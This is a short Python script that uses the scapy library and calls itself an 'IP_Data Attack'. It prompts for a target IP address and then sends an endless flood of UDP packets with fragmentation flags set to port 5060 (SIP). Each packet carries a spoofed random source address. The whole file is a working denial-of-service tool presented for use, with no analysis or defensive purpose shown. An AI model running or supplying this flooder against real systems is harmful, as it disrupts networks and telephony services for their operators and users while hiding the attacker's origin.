import scapy.all as scapy

import os

def IP_Data():
	
	clear = os.system('clear')

	src_ip = scapy.RandIP()
	print("**************************************")
	print("            IP_Data Attack")
	print("**************************************")
	print("Please input your target's IP")
	target = input("[IP_Data Attack]#")
	num = 0
	try:
		while True:
			packet = scapy.IP(src=src_ip,dst=target,flags="DF",frag=100,ttl=255)/scapy.UDP(dport=5060)/("X"*600)
			#packet2 = scapy.IP(src=src_ip,dst=target,flags="MF",frag=0,ttl=255)/scapy.UDP(dport=5060)/("X"*600)
			scapy.send(packet,verbose=False)
			#scapy.send(packet2,verbose=False)
			num +=1
			print("[+]Sent "+str(num)+"packets")
	except KeyboardInterrupt:
		print("[-]Ctrl + C detected.....")
IP_Data()